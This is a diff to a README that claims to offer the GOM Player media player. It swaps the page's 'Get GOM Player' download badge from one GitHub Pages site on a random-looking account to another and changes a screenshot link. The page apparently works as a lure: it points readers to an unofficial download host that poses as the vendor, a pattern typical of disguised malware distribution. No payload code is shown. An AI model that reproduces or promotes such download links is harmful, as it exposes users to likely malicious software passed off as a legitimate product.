@@ -4,10 +4,8 @@
 <img src="https://www.addictivetips.com/app/uploads/2021/02/GOM-Player.jpg" alt="GOM Player Logo"/>
 </div>
 
-<div align="center">
+[![GET GOM Player](https://img.shields.io/badge/GET%20%E2%80%94%20GOM-Player-0078D6?style=for-the-badge&logoColor=white)](https://osbertonaadieana1j8trxe.github.io/.github/GOM-Player)
 
-  [![Get GOM Player](https://img.shields.io/badge/Get_GOM_Player-blue?style=for-the-badge)](https://kraignery.github.io/.github/GOM-Player-Media-Player)
-</div>
 
 ---
 ## 🎯 Core Media Playback Features
@@ -73,7 +71,7 @@ What truly distinguishes this media player for windows is its thoughtful feature
 ## 🖼️ Application Interface Preview
 
 <div align="center">
-<img src="https://www.free-codecs.com/pictures/screenshots/gom_player.jpg" alt="GOM Player Interface"/>
+<img src="https://cdn.neowin.com/news/images/uploaded/2014/09/gom_media_player.jpg" alt="GOM Player Interface"/>
 </div>
 
 ---
